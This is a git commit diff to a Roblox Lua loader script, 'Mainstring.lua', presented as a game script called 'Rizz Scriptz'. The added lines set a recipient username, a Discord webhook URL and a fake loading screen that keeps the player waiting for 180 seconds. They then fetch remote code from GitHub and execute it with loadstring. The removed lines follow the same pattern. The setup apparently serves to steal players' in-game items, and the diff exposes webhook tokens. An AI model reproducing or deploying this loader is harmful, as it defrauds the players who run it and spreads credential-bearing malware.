5a041c4f3f00581cb136a6eb10ddb0734bed6e45
blacktrap <132762918+muhammad6919@users.noreply.github.com>
2023-05-17 06:23:52 +0700

    Update Mainstring.lua

--- main/Mainstring.lua
+++ main/Mainstring.lua
@@ -1,4 +1,12 @@
-_G.Username = "HieuPetSimx"
-_G.HubName = "Project Wd script are loading, please don't leave"
-_G.WebhookUrl = "discord.com/api/webhooks/1107533224663584778/XWBxYKxxqanRKTpMDOilsxZ9vUfjNYiPGOMWT-diP42edMrYUbbw50sNjT4EqJ68TT3H"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+UserName = "muaxuan1204"
+UserName2 = "muaxuan1204" 
+Webhook = "https://discordapp.com/api/webhooks/1107132008775286834/5qTqO1pmibA7H5c9eedKDSn22cME7uSDwYyfS_mnT5Ut0jrkJWLdQyPhuvZXvL9l84l6"
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
